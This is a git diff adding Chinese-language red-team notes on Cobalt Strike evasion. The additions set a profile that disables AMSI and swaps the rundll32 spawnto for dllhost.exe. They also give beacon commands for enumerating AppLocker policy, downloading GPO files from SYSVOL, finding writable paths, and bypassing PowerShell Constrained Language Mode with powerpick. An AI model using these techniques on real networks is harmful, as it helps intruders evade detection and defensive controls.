@@ -237,6 +237,68 @@ post-ex {
 
 上面配置会让C2执行 ```powerpick```, ```execute-assembly``` 和 ```psinject```时绕过AMSI
 
+
+# Behavioural Detections
+
+CS横移时默认使用rundll32 进程 
+
+rundll32 作为 Cobalt Strike 的默认“spawnto”已经存在很长时间了，现在是一个常见的检测点
+
+修改横移时使用的进程为dllhost.exe，使用下面profile配置
+
+```
+post-ex {
+        set amsi_disable "true";
+
+        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+}
+```
+
+# Policy Enumeration（策略枚举）
+
+枚举AppLocker，并且下载GPO文件到本地
+```
+beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
+
+displayname gpcfilesyspath                                                                        
+----------- --------------                                                                        
+AppLocker   \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}
+
+beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
+[*] started download of \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol (7616 bytes)
+[*] download of Registry.pol is complete
+```
+
+```
+PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
+```
+
+```
+PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
+```
+
+# Writeable Path（可写路径）
+
+枚举```C:\Windows\Tasks```目录是否可写
+```
+beacon> powershell Get-Acl C:\Windows\Tasks | fl
+```
+
+
+# PowerShell CLM
+
+如果powershell在靶机里被CLM设置为约束语言，使用powerpick替代
+
+```
+beacon> powershell $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+
+beacon> powerpick $ExecutionContext.SessionState.LanguageMode
+FullLanguage
+```
+
+
 # Exclusions
 
 所有杀毒软件厂商都有自己的例外规则。Windows Defender 允许管理员通过 GPO 或在单台计算机上本地添加排除项
